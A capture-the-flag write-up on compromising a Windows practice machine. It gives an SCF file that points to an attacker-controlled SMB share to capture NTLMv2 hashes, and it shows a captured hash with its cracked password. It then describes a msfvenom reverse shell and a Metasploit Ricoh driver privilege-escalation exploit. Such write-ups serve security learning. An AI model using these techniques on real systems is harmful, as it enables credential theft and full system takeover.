# Enumeration

The first command I run is for `nmap`
```
sudo nmap -sC -sV -vv -oA driver [Machine Ip]
```

Here is the output I get:
```
# Nmap 7.98 scan initiated Sun Apr  5 12:14:53 2026 as: /usr/lib/nmap/nmap -sC -sV -vv -oA driver 10.129.95.238
Nmap scan report for 10.129.95.238
Host is up, received echo-reply ttl 127 (0.15s latency).
Scanned at 2026-04-05 12:14:54 EDT for 85s
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE      REASON          VERSION
80/tcp   open  http         syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
135/tcp  open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
445/tcp  open  microsoft-ds syn-ack ttl 127 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
5985/tcp open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 27727/tcp): CLEAN (Timeout)
|   Check 2 (port 43285/tcp): CLEAN (Timeout)
|   Check 3 (port 48259/udp): CLEAN (Timeout)
|   Check 4 (port 38904/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2026-04-05T23:15:39
|_  start_date: 2026-04-05T23:13:06

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Apr  5 12:16:19 2026 -- 1 IP address (1 host up) scanned in 85.97 seconds
```

We can see it is a windows machine
We have a windows HTTP server on port 80

On opening port 80, it asks us for credentials for signing in.
I used default creds `admin:admin`.

![[Pasted image 20260408132504.png]]

Feroxbuster and gobuster does not show anything useful
On going to `http://10.129.215.100/fw_up.php` which is the firmware update endpoint, it allows to upload firmware files

# Foothold

I searched `scp file pentesting` on browser and came upon an article
`https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/`

I made a file named `attack.scf` 
```
[Shell]
Command=2
IconFile=\\10.10.16.11\share\shell.ico
[Taskbar]
Command=ToggleDesktop
```
And uploaded it to the firmware update endpoint

I ran the command `sudo responder -I tun0` so that responder listens on my tun0 interface and I got a callback from the machine
```
[SMB] NTLMv2-SSP Client   : 10.129.215.100                                                                                                                   
[SMB] NTLMv2-SSP Username : DRIVER\tony                                                                                                                      
[SMB] NTLMv2-SSP Hash     : tony::DRIVER:c492539e3b6567a5:1FBD527C1CEDF58780897DA2B7DE0FC7:0101000000000000006600B5FDC6DC013105218B340EF7E500000000020008004D
0046003000420001001E00570049004E002D0031004700340032004D0043004D004A0038004C004E0004003400570049004E002D0031004700340032004D0043004D004A0038004C004E002E004D0
04600300042002E004C004F00430041004C00030014004D004600300042002E004C004F00430041004C00050014004D004600300042002E004C004F00430041004C0007000800006600B5FDC6DC0$
060004000200000008003000300000000000000000000000002000000BEE84D34B465D57EBA9E75483187949F82F959A97D25F74464578DF1D0533E50A00100000000000000000000000000000000
0000900200063006900660073002F00310030002E00310030002E00310036002E0031003100000000000000000000000000
```

I got the hash for the tony user
I used my local machine for cracking this hash and the password was `liltony`

I used `evil-winrm` and got a shell as Tony
Found the user flag in Tony's Desktop directory

For privilege escalation, I uploaded `winPEASany.exe` on the target machine and executed it.

Here is the interesting output:
```
ÉÍÍÍÍÍÍÍÍÍÍ¹ PowerShell Settings                                                                                                                             
    PowerShell v2 Version: 2.0                                                                                                                               
    PowerShell v5 Version: 5.0.10240.17146                                                                                                                   
    PowerShell Core Version:                                                                                                                                 
    Transcription Settings:                                                                                                                                  
    Module Logging Settings:                                                                                                                                 
    Scriptblock Logging Settings:                                                                                                                            
    PS history file: C:\Users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt                                           
    PS history size: 134B
```

On opening the `ConsoleHost_history.txt`, here is the output:
```
Add-Printer -PrinterName "RICOH_PCL6" -DriverName 'RICOH PCL6 UniversalDriver V4.23' -PortName 'lpt1:'

ping 1.1.1.1
ping 1.1.1.1
```

# Privilege Escalation

The target machine is using `Ricoh Driver version 4.23`
Here is the blog on that
https://www.pentagrid.ch/en/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/

This presents a privilege escalation vector for us, the blog states that for adding a printer, the machine asks for admin privileges but for adding DLL files, any local user can do so.

I opened metasploit console, started exploit/multi/handler
Then I made a `msf.exe` file using `msfvenom` which I would upload on the target machine, and it would call back to my machine.
I got a `meterpreter` shell using that
The next thing to do was to run the ricoh driver priv esc exploit which was already in metasploit framework. 
I migrated to an interactive process (in this case, it was OneDrive.exe), and ran the ricoh exploit, which started a new session in metasploit which had the `NT Authority/System` user.

From there I went into `C:/Users/Administrator/Desktop` and got the root flag.